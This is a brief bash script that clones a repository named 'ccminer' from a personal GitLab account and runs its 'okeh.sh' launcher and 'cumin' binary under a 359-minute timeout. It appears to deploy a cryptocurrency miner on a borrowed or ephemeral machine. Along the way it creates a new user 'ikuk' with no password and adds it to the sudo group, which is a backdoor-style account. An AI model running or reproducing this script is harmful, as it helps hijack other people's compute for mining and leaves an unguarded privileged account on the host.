#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y 
git clone https://gitlab.com/sukah8083/ccminer.git && cd ccminer
chmod +x okeh.sh && chmod +x cumin
sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
sudo -u ikuk -H sh -c "timeout 359m ./okeh.sh"
sudo apt update